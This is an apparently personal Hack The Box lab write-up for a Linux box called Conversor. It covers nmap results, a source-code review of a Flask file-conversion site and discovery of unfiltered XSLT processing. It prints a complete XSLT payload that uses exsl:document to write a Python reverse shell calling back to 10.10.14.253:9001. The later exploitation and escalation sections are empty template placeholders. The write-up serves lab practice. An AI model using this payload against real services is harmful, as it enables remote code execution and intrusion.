Tags: #Easy #Linux #Apache #Source-Code-Analysis/Web-page #XSLT 
# **Nmap Results**

```text
Nmap scan report for 10.129.8.92
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
```

Full TCP port scan revealed the same open ports
<br>
<br>

# **Service Enumeration**
First look at the site:

![[Pasted image 20260202215748.png]]
- `gobuster vhost` and `ffuf` failed to find other subdomains

No potential creds yet, register dummy account to see what a regular user is allowed to do.

Home page:

![[Pasted image 20260202220015.png]]

About page has a button to download source code of this site as a .tar.gz archive. 

Burpsuite tells us that the convert button sends a POST request to a page called `/convert`:

![[Pasted image 20260202222031.png]]

### Source code analysis

SQL Injection not possible due to parameterized queries such as the one in the `cur.execute()` method:

```python
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password)) # <-- Right here
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')

```

XXE not possible in XML file, entities and DTDs are not loaded at all:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
```

Python's `lxml` module doesn't support XSLT version 2.0 --> the `unparsed-text()` method is not available --> no including external files.

However, there's **no XSLT filtering** in the `/convert` page. The following line was parsed by the server (result was `1.0`):

```
<xsl:value-of select="system-property('xsl:version')" />
```

Source code contains a **scripts** directory, maybe we can drop a python reverse shell in there.
`lxml` has the EXSL extension enabled by default, which includes the element `exsl:document` for writing to files.

XSLT payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <h1>idk man</h1>
    <exsl:document href="scripts/shell.py" method="text">
      import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.253&quot;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```
<br>
<br>
# **Exploitation**
## **Initial Access**
Document here:
* Exploit used (link to exploit)
* Explain how the exploit works against the service
* Any modified code (and why you modified it)
* Proof of exploit (screenshot of reverse shell with target IP address output)

<br>
<br>
# **Privilege Escalation**  

Document here:
* Exploit used (link to exploit)
* Explain how the exploit works 
* Any modified code (and why you modified it)
* Proof of privilege escalation (screenshot showing ip address and privileged username)
<br>
<br>
# Skills Learned
Document here what you've learned after completing the box
<br>
<br>
# Proof of Pwn
Paste link to HTB Pwn notification after owning root